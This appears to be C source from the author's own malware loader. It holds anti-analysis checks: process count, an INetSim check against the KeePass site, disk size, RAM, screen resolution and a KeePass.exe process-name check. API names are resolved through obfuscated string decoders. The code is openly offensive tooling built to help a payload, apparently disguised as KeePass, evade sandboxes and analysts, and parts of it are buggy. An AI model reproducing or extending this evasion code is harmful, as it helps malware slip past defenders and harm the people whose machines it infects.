#include <string.h>
#include <stdio.h>
#include <stdbool.h>
#include <shlwapi.h>



//Get the amout of running processes on the host and if there are less than 50 than this could be a sandbox
BOOL GetProcCount() {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    wchar_t* libName = L"P" L"s" L"a" L"p" L"i" L"." L"d" L"l" L"l";
    LoadLibraryW(libName);

    DWORD dp32dll = dc2(24);

    HMODULE hBase = GetHandle(dp32dll);

    LPCSTR lEnumProcesses = dc2(20);
    printf("Value of pEnumProcesses\n");
    getchar();

    FARPROC pEnumProcesses = GetProcAdd(hBase, lEnumProcesses);

    
    if (!pEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        return -1;
    }

    cProcesses = cbNeeded / sizeof(DWORD);

    if (cProcesses < 50) {
		return FALSE;
	}
	else {
		return TRUE;
	}

}

//This is custom to my loader but this will check if the string "Dominik Reichl" exits on the keepass site to see if this is conneting to INetSim
BOOL containsDominikReichl(uint8_t* response) {
    char* search = dc3(10);

    if (strstr((char*)response, search) != NULL) {
        return TRUE; // Found
    }
    else {
        return FALSE; // Not found
    }
}

//This will make the network connection to keepass
BOOL iNetNameCheck() {
    PBYTE pOutData = NULL;
    size_t sOutSize = 0;

    if (!GetURL(3, 9, &pOutData, &sOutSize)) {
        printf("Failed to get the URL\n");
        return NULL;
    }

    uint8_t* namecheck = (uint8_t*)malloc(sOutSize + 1);
    memcpy(namecheck, pOutData, sOutSize);
    namecheck[sOutSize] = '\0';

    free(pOutData);

    if (containsDominikReichl(namecheck) == TRUE) {
		printf("Dominik Reichl found in the data\n");
        return TRUE;
	}
	else {
		printf("Dominik Reichl not found in the data\n");
        return FALSE;
	}

}

//this will get the total disk space on the host and if its less than 50 it is likely a VM
BOOL GetDiskSpaceInfo(LPCWSTR drive) {
    ULARGE_INTEGER freeBytesAvailable;
    ULARGE_INTEGER totalNumberOfBytes;
    ULARGE_INTEGER totalNumberOfFreeBytes;
    ULARGE_INTEGER totalGigs;

    DWORD dK32dll = dc2(6);

    HMODULE hBase = GetHandle(dK32dll);

    LPCSTR lGetDiskFreeSpaceExW = dc2(21);

	FARPROC pGetDiskFreeSpaceExW = GetProcAdd(hBase, lGetDiskFreeSpaceExW);
 

    BOOL result = pGetDiskFreeSpaceExW(drive, &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes);
    totalGigs.QuadPart = totalNumberOfBytes.QuadPart / (1024 * 1024 * 1024);

    if (totalGigs.QuadPart < 50) {
        return FALSE;
    }
    else {
        return TRUE;
    }
}

//Gets total physical RAM and if less than 4 its likely a VM
BOOL totalRAM() {
    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);

    DWORD dK32dll = dc2(6);
    HMODULE hBase = GetHandle(dK32dll);

    LPCSTR lGlobalMemoryStatusEx = dc2(22);

    FARPROC pGlobalMemoryStatusEx = GetProcAdd(hBase, lGlobalMemoryStatusEx);

    pGlobalMemoryStatusEx(&status);
    if ((DWORD)status.ullTotalPhys <= (DWORD)(4 * 1073741824)) {
        return FALSE;
    }
    else {
        return TRUE;
    }
}

//Gets screen resolution and if less than 710 this is likely a sandbox like anyrun
BOOL ScreenRez() {
    int screenWidth, screenHeight;

    LoadLibraryW(L"User32.dll");


    DWORD du32dll = dc2(19);
    HMODULE hBase = GetHandle(du32dll);

    LPCSTR lGetSystemMetrics = dc2(23);

    FARPROC pGetSystemMetrics = GetProcAdd(hBase, lGetSystemMetrics);

    screenWidth = pGetSystemMetrics(SM_CXSCREEN);
    screenHeight = pGetSystemMetrics(SM_CYSCREEN);

    printf("Screen resolution is %d x %d\n", screenWidth, screenHeight);

    if (screenHeight > 710) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

//Gets the current process namee and in this case if its not [Keepass.exe] it is likely a sandbox.
BOOL ProcName() {
    char* neeedstobe = dc3(11);
    char processPath[MAX_PATH];
    
    DWORD dK32dll = dc2(6);
    HMODULE hBase = GetHandle(dK32dll);

    LPCSTR lGetModuleFileNameA = dc2(18);

    FARPROC pGetModuleFileNameA = GetProcAdd(hBase, lGetModuleFileNameA);

    pGetModuleFileNameA(NULL, processPath, MAX_PATH);
    const char* processName = PathFindFileNameA(processPath);
    printf("Process name is %s\n", processName);
    if (strcmp(processName, neeedstobe) == 0) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}


//this checks them all and if they all pass we good!
BOOL TheFinalBoss() {
	BOOL result = FALSE;
	BOOL result1 = GetProcCount();
	BOOL result2 = iNetNameCheck();
	BOOL result3 = GetDiskSpaceInfo(L"C:\\");
	BOOL result4 = totalRAM();
	BOOL result5 = ScreenRez();
	BOOL result6 = ProcName();

	if (result1 == TRUE && result2 == TRUE && result3 == TRUE && result4 == TRUE && result5 == TRUE && result6 == TRUE) {
		result = TRUE;
	}
	else {
		result = FALSE;
	}

	return result;
}
